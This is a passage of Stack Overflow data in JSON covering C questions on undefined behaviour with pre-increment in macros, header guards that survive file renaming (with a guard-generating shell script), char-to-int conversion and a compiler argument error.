"https://stackoverflow.com/users/34824/abelenky"}, "edited": false, "score": 0, "creation_date": 1482942621, "post_id": 41365932, "comment_id": 69933501, "body": "@abelenky , the macro expands to a function call. But I have adjusted the text to be more precise."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1482943843, "post_id": 41365932, "comment_id": 69934116, "body": "Could you clarify the first paragraph. It suggest that the undefined behavior will result in one of the two possible outcomes, which is not the case."}], "tags": [], "owner": {"reputation": 5994, "user_id": 5698738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4tnZ9.jpg?s=128&g=1", "display_name": "Aganju", "link": "https://stackoverflow.com/users/5698738/aganju"}, "is_accepted": false, "score": 2, "last_activity_date": 1482944364, "last_edit_date": 1482944364, "creation_date": 1482942073, "answer_id": 41365932, "question_id": 41365876, "link": "https://stackoverflow.com/questions/41365876/c-pre-and-post-increment-different-answers-in-different-programs/41365932#41365932", "title": "C, pre and post increment, different answers in different programs", "body": "<p><code>hypotenusa(++x, ++x)</code> is undefined behavior.<br>\nIt is up to the compiler which of the parameters gets incremented (and pushed) first - after the macro expansion, there are a total of four instances, and the sequence is not defined.</p>\n\n<p>You should never increment the same variable multiple times in the same statement, to avoid this kind of issues. Using a variable twice in a macro can hide this error and make it really nasty.</p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 2, "last_activity_date": 1482949656, "creation_date": 1482949656, "answer_id": 41367712, "question_id": 41365876, "link": "https://stackoverflow.com/questions/41365876/c-pre-and-post-increment-different-answers-in-different-programs/41367712#41367712", "title": "C, pre and post increment, different answers in different programs", "body": "<p>The behavior of your macro is undefined, meaning <em>any</em> result is possible.  </p>\n\n<p><a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">Chapter and verse</a></p>\n\n<blockquote>\n<strong>6.5 Expressions</strong><br>\n...<br>\n2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If a side effect on a scalar object is unsequenced relative to either a different side effect<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;on the same scalar object or a value computation using the value of the same scalar\nobject,<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the behavior is undefined. If there are multiple allowable orderings of the\nsubexpressions<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;of an expression, the behavior is undefined if such an unsequenced side\neffect occurs in any<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;of the orderings.<sup>84)</sup>\n<hr>\n<sup>\n84) This paragraph renders undefined statement expressions such as<pre><code>    i = ++i + 1;\n    a[i++] = i;\n</code></pre>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while allowing<pre><code>    i = i + 1;\n    a[i] = i;\n</code></pre>\n</sup>\n</blockquote>\n\n<p>Basically, if you modify the value of an object more than once in an expression, or both modify an object and use its value in a computation in an expression, the result will not be well-defined unless there is a <em>sequence point</em> in between those operations.  With a few exceptions, C does not force left-to-right evaluation of expressions or function parameter evaluations, nor does it mandate that the side effect of <code>++</code> or <code>--</code> be applied immediately after evaluation.  Thus, the result of an expression like <code>x++ * x++</code> will vary from platform to platform, program to program, or even potentially from run to run (although I've never seen that in practice).  </p>\n\n<p>For example, given the expression <code>y = x++ * x++</code>, the following evaluation sequence is possible:</p>\n\n<pre><code>t0 &lt;- x        // right hand x++, t0 == 2\nt1 &lt;- x        // left hand x++, t1 == 2\ny &lt;- t0 * t1   // y = 2 * 2 == 4\nx &lt;- x + 1     // x == 3\nx &lt;- x + 1     // x == 4\n</code></pre>\n\n<p>which doesn't give you the result you expect if you assume left-to-right evaluation.  </p>\n"}], "owner": {"reputation": 29, "user_id": 6319776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5f05be327b72227169df28a43a4a286?s=128&d=identicon&r=PG&f=1", "display_name": "mikeN", "link": "https://stackoverflow.com/users/6319776/miken"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "closed_date": 1482968604, "accepted_answer_id": 41365921, "answer_count": 3, "score": 1, "last_activity_date": 1482950411, "creation_date": 1482941879, "last_edit_date": 1482950411, "question_id": 41365876, "link": "https://stackoverflow.com/questions/41365876/c-pre-and-post-increment-different-answers-in-different-programs", "closed_reason": "Duplicate", "title": "C, pre and post increment, different answers in different programs", "body": "<p>testing some code  when studying C language, </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#define hypotenusa(x, y)  sqrt((x) * (x) + (y) * (y))\n\nint main(void) {\n    int a, x;\n    x = 2;\n    a = hypotenusa(++x, ++x);\n    printf(\"%d\\n\", a);\n}\n</code></pre>\n\n<p>And I am getting the answer</p>\n\n<ul>\n<li><code>6</code> in one program(dosbox gcc compiler)</li>\n<li><code>7</code> in codelight gcc compiler and </li>\n<li><code>8</code> on codeChef online compiler</li>\n</ul>\n\n<p>can anyone explain this behaviour? \nmy logic says it should be <code>6</code> (<code>sqrt(42)</code>) but...</p>\n"}, {"tags": ["c", "c-preprocessor", "header-files"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user3458"}, "edited": false, "score": 3, "creation_date": 1482942028, "post_id": 41365842, "comment_id": 69933178, "body": "Strictly speaking, you don&#39;t <i>need</i> to change header guard after renaming - not unless you have another file that takes over the old name."}, {"owner": {"reputation": 1038, "user_id": 3789460, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/f5f2abcd560dd9936127551eb8b67d42?s=128&d=identicon&r=PG&f=1", "display_name": "work.bin", "link": "https://stackoverflow.com/users/3789460/work-bin"}, "edited": false, "score": 0, "creation_date": 1482942554, "post_id": 41365842, "comment_id": 69933462, "body": "I know, but this way I can be worry-less (sic)."}, {"owner": {"reputation": 35543, "user_id": 149530, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9b6c8b04130af49735de5be666d67c00?s=128&d=identicon&r=PG", "display_name": "Michael Foukarakis", "link": "https://stackoverflow.com/users/149530/michael-foukarakis"}, "edited": false, "score": 2, "creation_date": 1482942750, "post_id": 41365842, "comment_id": 69933574, "body": "You can use an identifier with a prefix plus a UUID and be even more worry-less."}, {"owner": {"reputation": 1038, "user_id": 3789460, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/f5f2abcd560dd9936127551eb8b67d42?s=128&d=identicon&r=PG&f=1", "display_name": "work.bin", "link": "https://stackoverflow.com/users/3789460/work-bin"}, "reply_to_user": {"reputation": 35543, "user_id": 149530, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9b6c8b04130af49735de5be666d67c00?s=128&d=identicon&r=PG", "display_name": "Michael Foukarakis", "link": "https://stackoverflow.com/users/149530/michael-foukarakis"}, "edited": false, "score": 0, "creation_date": 1482942873, "post_id": 41365842, "comment_id": 69933629, "body": "@MichaelFoukarakis - I didn&#39;t get it; could you explain it using the <i>test_header.h</i> example."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1482944165, "post_id": 41365842, "comment_id": 69934274, "body": "<code>#pragma once</code> is supported on many compilers..."}, {"owner": {"reputation": 1038, "user_id": 3789460, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/f5f2abcd560dd9936127551eb8b67d42?s=128&d=identicon&r=PG&f=1", "display_name": "work.bin", "link": "https://stackoverflow.com/users/3789460/work-bin"}, "edited": false, "score": 0, "creation_date": 1482944515, "post_id": 41365842, "comment_id": 69934453, "body": "Currently my team follows a strict &quot;no pragma&quot; coding standard (because it reduces portability). <i>(Maybe it is time to relook the coding standards.)</i>"}, {"owner": {"reputation": 14316, "user_id": 1012936, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eXQaP.png?s=128&g=1", "display_name": "milleniumbug", "link": "https://stackoverflow.com/users/1012936/milleniumbug"}, "edited": false, "score": 1, "creation_date": 1482945813, "post_id": 41365842, "comment_id": 69935058, "body": "There are <code>#pragma once</code> to include guard converters and vice versa. <a href=\"https://github.com/qtproject/qt-creator/commit/39a38d5679084b515276285c044d8a27e671adb1\" rel=\"nofollow noreferrer\">Qt Creator recently used one to convert all their headers to use <code>#pragma once</code></a>"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1482945864, "post_id": 41365842, "comment_id": 69935074, "body": "@work.bin, there is a handful of pragmas that are in fact defined by standard C -- portability is not an issue for those particular pragmas.  But <code>#pragma once</code> is not among those, and I&#39;m inclined to agree with the idea of avoiding implementation defined behavior, such as use of non-standard pragmas produces."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1482969699, "post_id": 41365842, "comment_id": 69944596, "body": "Create a UUID or GUID and use that as the header guard (or a hash of some sort \u2014 MD5, SHA1, SHA2, SHA3, \u2026).  The only trick is dealing with the possibility of a leading digit; that&#39;s easily worked around (I used <code>H_</code> as a prefix)."}, {"owner": {"reputation": 1038, "user_id": 3789460, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/f5f2abcd560dd9936127551eb8b67d42?s=128&d=identicon&r=PG&f=1", "display_name": "work.bin", "link": "https://stackoverflow.com/users/3789460/work-bin"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482976772, "post_id": 41365842, "comment_id": 69946108, "body": "@JonathanLeffler - So the header guard macro you used was &quot;H_&lt;40 SHA1 chars&gt;&quot;, i.e. did you use all 40 characters of the hash (assuming it was SHA1)?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482978099, "post_id": 41365842, "comment_id": 69946352, "body": "@work.bin : near enough, yes.  As long as the content you&#39;re hashing is unique it works fine."}, {"owner": {"reputation": 1038, "user_id": 3789460, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/f5f2abcd560dd9936127551eb8b67d42?s=128&d=identicon&r=PG&f=1", "display_name": "work.bin", "link": "https://stackoverflow.com/users/3789460/work-bin"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482979270, "post_id": 41365842, "comment_id": 69946600, "body": "@JonathanLeffler - Could you please add this as an answer?"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user3458"}, "edited": false, "score": 0, "creation_date": 1482942680, "post_id": 41365994, "comment_id": 69933531, "body": "Your script can also delete old include guards if they have distinctive format, or do nothing if the right guards are already present"}], "tags": [], "owner": {"reputation": 201, "user_id": 7291911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/acdca85267f3fcca6881f482693aec32?s=128&d=identicon&r=PG&f=1", "display_name": "fer-rum", "link": "https://stackoverflow.com/users/7291911/fer-rum"}, "is_accepted": false, "score": 4, "last_activity_date": 1482942304, "creation_date": 1482942304, "answer_id": 41365994, "question_id": 41365842, "link": "https://stackoverflow.com/questions/41365842/is-there-a-way-to-implement-a-header-guard-that-doesnt-have-to-be-modified-when/41365994#41365994", "title": "Is there a way to implement a header guard that doesn&#39;t have to be modified when the header file is renamed?", "body": "<p>You can name the header guards whatever you like.</p>\n\n<ul>\n<li>If your header is related to a certain topic, name it after that i.e. <code>LIST_OPERATIONS</code></li>\n<li>Omit the guards and write a script that inserts them based on the current file name. Run this script as part of your build process before compiling. (Remember to either create a modified copy or remove the includes after the build, otherwise you end up with a lot of include guards in your header)</li>\n<li>Depending on the compilers that should be used for your project, they might support the <code>#pragma once</code> approach.</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1482945462, "post_id": 41366425, "comment_id": 69934887, "body": "But programs that use <code>#pragma once</code> nevertheless are not strictly conforming.  If your objective is to write portable code then you will not use it, the proportion of major compilers supporting it notwithstanding."}], "tags": [], "owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "is_accepted": false, "score": 3, "last_activity_date": 1482945621, "last_edit_date": 1495541336, "creation_date": 1482944075, "answer_id": 41366425, "question_id": 41365842, "link": "https://stackoverflow.com/questions/41365842/is-there-a-way-to-implement-a-header-guard-that-doesnt-have-to-be-modified-when/41366425#41366425", "title": "Is there a way to implement a header guard that doesn&#39;t have to be modified when the header file is renamed?", "body": "<p><a href=\"https://en.wikipedia.org/wiki/Pragma_once\" rel=\"nofollow noreferrer\"><code>#pragma once</code></a></p>\n\n<p>It's very portable, being well-supported by all major compilers, and by 13 out of 14 compilers (<a href=\"https://en.wikipedia.org/wiki/Pragma_once#Portability\" rel=\"nofollow noreferrer\">according to Wikipedia</a>).</p>\n\n<p>Also check out <a href=\"https://stackoverflow.com/q/1143936/3425536\">#pragma once vs include guards?</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 2, "last_activity_date": 1482980459, "creation_date": 1482980459, "answer_id": 41372576, "question_id": 41365842, "link": "https://stackoverflow.com/questions/41365842/is-there-a-way-to-implement-a-header-guard-that-doesnt-have-to-be-modified-when/41372576#41372576", "title": "Is there a way to implement a header guard that doesn&#39;t have to be modified when the header file is renamed?", "body": "<p>As others have noted, what you use as a header guard isn't intrinsically important; it just needs to be unique across the set of headers that might ever be co-included.</p>\n\n<p>You can create a UUID or GUID and use that as the header guard (or a hash of some sort \u2014 MD5, SHA1, SHA2, SHA3, \u2026). The only trick is dealing with the possibility of a leading digit; that's easily worked around (I used <code>H_</code> as a prefix).</p>\n\n<p>Mostly though, I use a name based on the file name, and don't usually rename headers often enough that it is a problem.</p>\n\n<p>Here's a script called <code>hdrguard</code> that I use for generating the header guard lines for a given header file:</p>\n\n<pre><code>#!/bin/sh\n#\n# @(#)$Id: hdrguard.sh,v 1.8 2016/05/09 18:41:57 jleffler Exp $\n#\n# Generate #ifndef sequence to guard header against multiple inclusion\n\narg0=$(basename $0 .sh)\n\nusestr=\"Usage: $arg0 [-bdfhimV] header.h [...]\"\n\nusage()\n{\n    echo \"$usestr\" 1&gt;&amp;2\n    exit 1\n}\n\nhelp()\n{\n    echo \"$usestr\"\n    echo\n    echo \"  -b  Use base name of file for guard\"\n    echo \"  -d  Use _DOT_H after name (instead of _H)\"\n    echo \"  -f  Use specified path name of file for guard (default)\"\n    echo \"  -h  Print this help message and exit\"\n    echo \"  -i  Omit _INCLUDED after name\"\n    echo \"  -m  Generate MD5 hash value as header guard\"\n    echo \"  -V  Print version information and exit\"\n    exit 0\n}\n\nopt_incl=yes\nopt_base=no\nopt_dot=no\nopt_md5=no\nwhile getopts bdfhimV opt\ndo\n    case \"$opt\" in\n    (b) opt_base=yes;;\n    (d) opt_dot=yes;;\n    (f) opt_base=no;;\n    (h) help;;\n    (i) opt_incl=no;;\n    (m) opt_md5=yes;;\n    (V) echo \"$arg0: HDRGUARD Version \"'$Revision: 1.8 $ ($Date: 2016/05/09 18:41:57 $)' | rcsmunger; exit 0;;\n    (*) usage;;\n    esac\ndone\n\nshift $(($OPTIND - 1))\n\n[ $# -eq 0 ] &amp;&amp; usage\n\nfor i in \"$@\"\ndo\n    if [ $opt_base = yes ]\n    then i=$(basename $i)\n    fi\n    if [ $opt_dot = yes ]\n    then i=$(echo \"$i\" | sed 's/\\.h$/_dot_h/')\n    fi\n    i=$(echo $i | tr 'a-z' 'A-Z' | tr -s '/+.-' '____' | sed 's/^_//')\n    if [ $opt_incl = yes ]\n    then\n        case \"$i\" in\n        (*_INCLUDED)\n            : OK;;\n        (*)\n            i=\"${i}_INCLUDED\";;\n        esac\n    fi\n    if [ $opt_md5 = yes ]\n    then\n        tmp=$(mktemp ./hdrgrd.XXXXXXXX)\n        trap \"rm -f $tmp; exit 1\" 0 1 2 3 13 15 \n        echo \"$i.$(isodate compact)\" &gt; \"$tmp\"\n        i=$(md5 \"$tmp\" | sed 'y/abcdef/ABCDEF/; s/\\([^ ]*\\) .*/H_\\1/')\n        rm -f \"$tmp\"\n        trap 0 1 2 3 13 15\n    fi\n    echo\n    echo \"#ifndef $i\"\n    echo \"#define $i\"\n    echo\n    echo \"#endif /* $i */\"\n    echo\ndone\n</code></pre>\n\n<p>It doesn't have code for SHA1, SHA2 or SHA3 \u2014 it optionally uses MD5 (in the form of a command <code>md5</code>). It would not be very hard to add support for alternative hashing algorithms.  It doesn't require the file to exist.</p>\n\n<p>Example uses:</p>\n\n<pre><code>$ hdrguard header.h\n\n#ifndef HEADER_H_INCLUDED\n#define HEADER_H_INCLUDED\n\n#endif /* HEADER_H_INCLUDED */\n\n$ hdrguard -m header.h\n\n#ifndef H_6DC5070597F88701EB6D2CCAACC73383\n#define H_6DC5070597F88701EB6D2CCAACC73383\n\n#endif /* H_6DC5070597F88701EB6D2CCAACC73383 */\n\n$\n</code></pre>\n\n<p>I frequently use it from within <code>vim</code>, typing a command such as <code>!!hdrguard %</code> while the cursor is on an empty line to generate a header guard suitable for the header I'm editing.  That's why it generates the blank lines top and bottom, too.</p>\n\n<p>The command uses scripts <code>isodate</code> and <code>rcsmunger</code>. With the argument <code>compact</code>, the <code>isodate</code> command is equivalent to:</p>\n\n<pre><code>date +'%Y%m%d.%H%M%S'\n</code></pre>\n\n<p>The complete command supports a number of alternative formats and is more succinct than having to type the <code>date</code> command out everywhere.  You're entirely at liberty to forego the use of a separate script and to just embed the expansion shown into <code>hdrguard</code>.  Indeed, you could use just <code>date</code> and it would be OK; it is just seed material for the hashing operation to make the data being hashed unique.</p>\n\n<pre><code>$ isodate compact\n20161228.185232\n$\n</code></pre>\n\n<p>The <code>rcsmunger</code> command just converts RCS ID strings into a format I prefer for reporting version information:</p>\n\n<pre><code>#!/usr/bin/env perl -p\n#\n# @(#)$Id: rcsmunger.pl,v 1.9 2015/11/02 23:54:32 jleffler Exp $\n#\n# Remove the keywords around the values of RCS keywords\n\nuse strict;\nuse warnings;\n\n# Beware of RCS hacking at RCS keywords!\n# Convert date field to ISO 8601 (ISO 9075) notation\ns%\\$(Date:) (\\d\\d\\d\\d)/(\\d\\d)/(\\d\\d) (\\d\\d:\\d\\d:\\d\\d) \\$%\\$$1 $2-$3-$4 $5 \\$%go;\n# Remove keywords\ns/\\$([A-Z][a-z]+|RCSfile): ([^\\$]+) \\$/$2/go;\n</code></pre>\n\n<p>For example:</p>\n\n<pre><code>$ hdrguard -V\nhdrguard: HDRGUARD Version 1.8 (2016-05-09 18:41:57)\n$\n</code></pre>\n\n<p>You can regard the printing of version information as old-school version control; it has to be done differently if you use a DVCS such as <code>git</code>, which is one reason I've not done a wholesale migration to <code>git</code> for my personal software collection.</p>\n"}], "owner": {"reputation": 1038, "user_id": 3789460, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/f5f2abcd560dd9936127551eb8b67d42?s=128&d=identicon&r=PG&f=1", "display_name": "work.bin", "link": "https://stackoverflow.com/users/3789460/work-bin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 741, "favorite_count": 1, "closed_date": 1484721430, "accepted_answer_id": 41372576, "answer_count": 3, "score": -1, "last_activity_date": 1483456557, "creation_date": 1482941746, "last_edit_date": 1483456557, "question_id": 41365842, "link": "https://stackoverflow.com/questions/41365842/is-there-a-way-to-implement-a-header-guard-that-doesnt-have-to-be-modified-when", "closed_reason": "Opinion-based", "title": "Is there a way to implement a header guard that doesn&#39;t have to be modified when the header file is renamed?", "body": "<p>Currently for a header file named <em>test_header.h</em> I use -</p>\n\n<pre><code>#ifndef TEST_HEADER_H\n#define TEST_HEADER_H   \n/* code */\n#endif /* TEST_HEADER_H */\n</code></pre>\n\n<p>What I want is a header guard which doesn't use the file name directly. Something like (<em>i.e. wishful crude hypothetical solution</em>) -</p>\n\n<pre><code>#if __FILE__ not in INCLUDE_LIST\n#APPEND(INCLUDE_LIST, __FILE__)\n/* code */\n#endif\n</code></pre>\n"}, {"tags": ["c", "casting", "char", "int", "type-conversion"], "comments": [{"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 1, "creation_date": 1482941035, "post_id": 41365518, "comment_id": 69932628, "body": "Um... Is &quot;char &#39;0&#39;&quot; the <i>only</i> thing you need to convert? What about any other char values?"}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "reply_to_user": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1482941042, "post_id": 41365518, "comment_id": 69932632, "body": "There was comment about 48 at some point here. Would like to know more about that approach."}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 1, "creation_date": 1482941141, "post_id": 41365518, "comment_id": 69932699, "body": "48 works in ascii but not ebcdic. @Scott Hunters answer below s/b portable."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "reply_to_user": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1482941168, "post_id": 41365518, "comment_id": 69932713, "body": "@AnT the idea is to map that <code>string</code> to a bit array."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 2, "creation_date": 1482941266, "post_id": 41365518, "comment_id": 69932763, "body": "@KcFnMi: That probably means you need to convert <code>&#39;0&#39;</code> to <code>0</code> and <code>&#39;1&#39;</code> to <code>1</code>. Worth mentioning that second part, if that&#39;s the case."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 0, "creation_date": 1482941384, "post_id": 41365518, "comment_id": 69932834, "body": "Should I do <code>if (ch == &#39;0&#39;) x = 0 else x = 1;</code>? Is there a shorter way to do that?"}], "answers": [{"tags": [], "owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "is_accepted": true, "score": 7, "last_activity_date": 1482940725, "creation_date": 1482940725, "answer_id": 41365557, "question_id": 41365518, "link": "https://stackoverflow.com/questions/41365518/c-cast-literal-char-0-to-int-0-zero-how/41365557#41365557", "title": "C cast literal char &#39;0&#39; to int 0 (zero), how?", "body": "<pre><code>ch = 0;\n</code></pre>\n\n<p>Now, if you want to convert <em>any</em> digit-character to its numeric equivalent, you'd need something like:</p>\n\n<pre><code>ch = ch - '0';\n</code></pre>\n"}], "owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2492, "favorite_count": 0, "accepted_answer_id": 41365557, "answer_count": 1, "score": -1, "last_activity_date": 1482940871, "creation_date": 1482940580, "last_edit_date": 1482940871, "question_id": 41365518, "link": "https://stackoverflow.com/questions/41365518/c-cast-literal-char-0-to-int-0-zero-how", "title": "C cast literal char &#39;0&#39; to int 0 (zero), how?", "body": "<p>How would I go to cast/convert literal <code>char '0'</code> to <code>int 0</code>?</p>\n\n<p>i.e.:</p>\n\n<pre><code>char string[] = \"0101\";\nchar ch = string[0];\nx = magic(ch);\nif (x)\n    printf(\"int zero\")\n</code></pre>\n"}, {"tags": ["c", "compiler-errors"], "answers": [{"comments": [{"owner": {"reputation": 692, "user_id": 7326827, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/K1zX2.jpg?s=128&g=1", "display_name": "avilac", "link": "https://stackoverflow.com/users/7326827/avilac"}, "reply_to_user": {"reputation": 345, "user_id": 7350448, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/649078feaf1e14298ad543d388f0a4f7?s=128&d=identicon&r=PG&f=1", "display_name": "Ma250", "link": "https://stackoverflow.com/users/7350448/ma250"}, "edited": false, "score": 0, "creation_date": 1482941407, "post_id": 41365551, "comment_id": 69932848, "body": "Can&#39;t explain better than @tuple_cat!"}], "tags": [], "owner": {"reputation": 692, "user_id": 7326827, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/K1zX2.jpg?s=128&g=1", "display_name": "avilac", "link": "https://stackoverflow.com/users/7326827/avilac"}, "is_accepted": false, "score": 1, "last_activity_date": 1530416823, "last_edit_date": 1530416823, "creation_date": 1482940704, "answer_id": 41365551, "question_id": 41365499, "link": "https://stackoverflow.com/questions/41365499/error-too-few-arguments-to-function-printday-c-language/41365551#41365551", "title": "error: too few arguments to function `printDay&#39; (C language)", "body": "<p>I think that I've found the source of the error:</p>\n\n<p>On line 45, you have <em><code>printDay(input());</code></em><br>\nIt makes me think that this is the error because the message is, \"<em>error: too few arguments to function `printDay'</em>\", and you are only passing <strong>one parameter</strong>!</p>\n\n<p>Hope it helps!</p>\n"}, {"tags": [], "owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "is_accepted": true, "score": 3, "last_activity_date": 1482941099, "creation_date": 1482941099, "answer_id": 41365669, "question_id": 41365499, "link": "https://stackoverflow.com/questions/41365499/error-too-few-arguments-to-function-printday-c-language/41365669#41365669", "title": "error: too few arguments to function `printDay&#39; (C language)", "body": "<blockquote>\n  <ol>\n  <li>What does it mean?</li>\n  